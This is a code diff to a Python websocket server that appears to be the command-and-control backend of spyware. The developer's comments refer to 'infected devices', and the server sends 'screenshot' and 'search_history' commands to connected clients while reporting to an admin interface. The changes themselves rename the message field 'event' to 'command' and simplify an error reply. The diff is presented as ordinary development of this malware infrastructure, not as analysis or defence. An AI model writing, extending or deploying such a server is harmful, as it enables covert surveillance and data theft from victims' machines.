@@ -33,9 +33,9 @@ async def handle_client(websocket):
             try:
                 # Parse the JSON message
                 data = json.loads(client_message)
-                command = data.get("event")
+                command = data.get("command")
                 payload = data.get("payload")
-                logger.info(f"Received event: {command}")
+                logger.info(f"Received command: {command}")
                 
                 # Process the event and respond (?)
                 if command == "screenshot":
@@ -46,11 +46,11 @@ async def handle_client(websocket):
 
                     # Broadcast the search history to the admin interface (this is kinda meh implementation because it also broadcasts to infected devices, 
                     # should work for now but ill look into it at some point)
-                    await broadcast({"event": "search_history"})
+                    await broadcast({"command": "search_history"})
 
                 #not sure if notifying clients of errors really is a great idea :D
                 else:
-                    response = {"event": "error"}
+                    response = {"command": "error"}
                 
                 # Send the JSON response back to the client
                 await websocket.send(json.dumps(response))
@@ -58,7 +58,7 @@ async def handle_client(websocket):
 
             except json.JSONDecodeError:
                 # Handle invalid JSON
-                error_response = {"event": "error", "payload": "Invalid JSON format"}
+                error_response = {"command": "error"}
                 await websocket.send(json.dumps(error_response))
                 logger.error(f"Invalid JSON received: {client_message}")
     except websockets.exceptions.ConnectionClosed as e:
@@ -89,14 +89,14 @@ async def send_command_to_all(command):
             logger.warning("Failed to send command to a client. Client disconnected.")
 
 # Not used at the moment, but might become useful down the road
-async def send_command_to_client(client, event, payload=None):
+async def send_command_to_client(client, command, payload=None):
     message = {
-        "event": event,
+        "command": command,
         "payload": payload or {}
     }
     try:
         await client.send(json.dumps(message))
-        logger.info(f"Sent {event} command to specific client: {message}")
+        logger.info(f"Sent {command} command to specific client: {message}")
     except websockets.exceptions.ConnectionClosed:
         logger.warning("Failed to send command to the client. Client disconnected.")
 
